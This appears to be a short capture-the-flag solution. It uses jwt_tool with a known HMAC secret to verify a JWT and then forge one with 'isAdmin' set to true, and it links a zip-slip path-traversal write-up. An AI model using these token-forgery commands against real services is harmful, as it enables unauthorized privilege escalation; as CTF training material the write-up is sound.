# Solution

## Check

```sh
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ7XCJ1c2VybmFtZVwiOiBcImd1ZXN0XCIsIFwiaXNBZG1pblwiOiBmYWxzZSwgXCJjb25maWdmaWxlXCI6IFwiZGVmYXVsdC5jb25mLnlhbWxcIn0iLCJpYXQiOjE3MTEwMDk2NjMsIm5iZiI6MTcxMTAwOTY2MywianRpIjoiNTFiZjhhODctYmUyNC00ZDUwLWJkOTQtYzYxZjRjZThiNzYxIiwiZXhwIjoxNzExMDEwNTYzLCJ0eXBlIjoiYWNjZXNzIiwiZnJlc2giOmZhbHNlfQ.5r6XJ_07zaadcMv2hCdoHjMM5FidRrMImZGUZDqPlwE \
    -p 5b8a57b9e2a8fad8e295044bc99cb4a0 \
    -C
```

## Modify

```sh
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ7XCJ1c2VybmFtZVwiOiBcImd1ZXN0XCIsIFwiaXNBZG1pblwiOiBmYWxzZSwgXCJjb25maWdmaWxlXCI6IFwiZGVmYXVsdC5jb25mLnlhbWxcIn0iLCJpYXQiOjE3MTEwMDk2NjMsIm5iZiI6MTcxMTAwOTY2MywianRpIjoiNTFiZjhhODctYmUyNC00ZDUwLWJkOTQtYzYxZjRjZThiNzYxIiwiZXhwIjoxNzExMDEwNTYzLCJ0eXBlIjoiYWNjZXNzIiwiZnJlc2giOmZhbHNlfQ.5r6XJ_07zaadcMv2hCdoHjMM5FidRrMImZGUZDqPlwE \
    -p 5b8a57b9e2a8fad8e295044bc99cb4a0 \
    -S hs256 \
    -I \
    -pc sub \
    -pv '"{"username": "guest", "isAdmin": true, "configfile": "default.conf.yaml"}"'
```

## Links

- zip slip
- <https://blog.bi0s.in/2020/06/07/Web/Defenit20-TarAnalyzer/>
